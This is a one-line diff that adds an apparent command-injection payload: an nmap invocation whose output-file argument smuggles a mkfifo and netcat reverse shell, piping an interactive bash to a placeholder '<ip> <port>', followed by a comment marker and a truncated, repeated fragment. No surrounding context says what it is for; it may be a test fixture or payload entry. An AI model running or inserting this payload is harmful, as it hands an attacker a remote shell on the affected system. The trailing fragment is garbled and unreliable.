@@ -1,0 +1,1 @@
+sh -e nmap --top-ports 10 -oN recon//tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ip> <port> >/tmp/f #.nmap /tmp/f;mkfi
